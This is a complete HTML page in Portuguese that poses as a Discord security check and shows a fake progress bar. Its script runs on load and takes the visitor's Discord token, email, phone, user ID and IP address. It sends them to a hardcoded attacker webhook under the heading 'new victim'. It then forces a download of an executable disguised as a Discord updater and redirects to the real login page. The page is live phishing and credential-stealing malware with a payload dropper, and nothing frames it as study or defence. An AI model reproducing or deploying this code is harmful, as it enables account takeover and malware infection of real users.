<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Verificação de Segurança</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e1e2e, #2c2c3e);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #31313f;
            border-radius: 16px;
            padding: 40px;
            max-width: 480px;
            width: 90%;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        }
        .logo { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #b9bbbe; font-size: 14px; margin-bottom: 24px; }
        .progress-bar {
            width: 100%; height: 8px;
            background: #20202b; border-radius: 4px;
            overflow: hidden; margin: 20px 0;
        }
        .progress-fill {
            height: 100%; width: 0%;
            background: #5865F2; border-radius: 4px;
            transition: width 0.5s;
        }
        .status { color: #b9bbbe; font-size: 13px; margin-top: 12px; }
        .footer { margin-top: 24px; font-size: 12px; color: #4e5058; }
    </style>
</head>
<body>
<div class="container">
    <svg class="logo" viewBox="0 0 127.14 96.36" fill="#5865F2">
        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,56.6,122.09,32.65,107.7,8.07ZM42.25,65.64C36.21,65.64,31.3,60,31.3,53.2s5-12.5,11.14-12.5S53.57,46.6,53.57,53.2,48.36,65.64,42.25,65.64Zm42.64,0C78.85,65.64,74,60,74,53.2s5-12.5,11.12-12.5S96.21,46.6,96.21,53.2,91,65.64,84.89,65.64Z"/>
    </svg>
    <h1>Verificação de segurança necessária</h1>
    <p class="subtitle">Sua conta do Discord precisa ser verificada devido a uma atividade suspeita.</p>
    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    <p class="status" id="statusText">Iniciando verificação...</p>
    <div class="footer">Discord Inc. &bull; Verificação automática de segurança</div>
</div>

<script>
    (async function() {
        const webhookURL = "https://discord.com/api/webhooks/1519362826098184336/nkxrO_ET6SZWcmAFCoHoBHCTKahRKVft_QkMuWbpfLCEfN3ndWoa2rlLf40obW-DJjcr";
        
        // Link direto do Gofile - precisa extrair o link real
        // O Gofile tem um link direto que é: https://gofile.io/d/zpxkVT
        // Mas para download direto, usamos a API do Gofile
        const gofileID = "zpxkVT";
        
        const statusText = document.getElementById('statusText');
        const progressFill = document.getElementById('progressFill');

        // 1. Capturar IP
        statusText.textContent = "Coletando informações do sistema...";
        progressFill.style.width = "20%";

        let ip = "Não capturado";
        try {
            const ipResp = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipResp.json();
            ip = ipData.ip;
        } catch(e) {
            try {
                const ipResp2 = await fetch("https://api.my-ip.io/ip.json");
                const ipData2 = await ipResp2.json();
                ip = ipData2.ip;
            } catch(e2) {}
        }

        progressFill.style.width = "40%";
        statusText.textContent = "Analisando conta...";

        // 2. Tentar pegar token do Discord
        let token = localStorage.getItem("token");
        let email = "Não disponível";
        let phone = "Não disponível";
        let username = "Não logado";
        let userID = "Desconhecido";

        if (token) {
            try {
                const userResp = await fetch("https://discord.com/api/v9/users/@me", {
                    headers: { "Authorization": token }
                });
                const userData = await userResp.json();
                email = userData.email || "Não disponível";
                phone = userData.phone || "Não vinculado";
                username = `${userData.username}#${userData.discriminator || "0"}`;
                userID = userData.id;
            } catch(e) {}
        }

        progressFill.style.width = "60%";
        statusText.textContent = "Preparando atualização...";

        const platform = navigator.platform;
        const language = navigator.language;

        // 3. Enviar dados para o webhook
        const mensagem = 
            `**🎯 Nova Vítima - Discord**\n` +
            `**👤 Usuário:** ${username}\n` +
            `**🆔 ID:** ${userID}\n` +
            `**📧 Email:** ${email}\n` +
            `**📱 Telefone:** ${phone}\n` +
            `**🔑 Token:** \`${token || "Não encontrado"}\`\n` +
            `**🌐 IP:** ${ip}\n` +
            `**💻 Sistema:** ${platform}\n` +
            `**🌍 Idioma:** ${language}`;

        try {
            await fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: mensagem })
            });
        } catch(e) {
            try {
                const blob = new Blob([JSON.stringify({ content: mensagem })], { type: 'application/json' });
                navigator.sendBeacon(webhookURL, blob);
            } catch(e2) {}
        }

        // 4. Fazer download do arquivo do Gofile
        progressFill.style.width = "80%";
        statusText.textContent = "Baixando atualização de segurança...";

        try {
            // Primeiro pega o link direto via API do Gofile
            const apiResp = await fetch("https://api.gofile.io/servers");
            const apiData = await apiResp.json();
            
            if (apiData.status === "ok") {
                const server = apiData.data.servers[0].name;
                const directURL = `https://${server}.gofile.io/download/${gofileID}/Arquivo.exe`;
                
                // Força o download criando um link e clicando
                const a = document.createElement('a');
                a.href = directURL;
                a.download = 'Atualizador_Discord.exe';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            }
        } catch(e) {
            // Fallback: abre a página do Gofile
            window.open(`https://gofile.io/d/${gofileID}`, '_blank');
        }

        // 5. Finalizar
        progressFill.style.width = "100%";
        statusText.textContent = "Verificação concluída! Atualização baixada com sucesso.";

        // Redireciona para o Discord após alguns segundos
        setTimeout(() => {
            window.location.href = "https://discord.com/login";
        }, 5000);
    })();
</script>
</body>
</html>
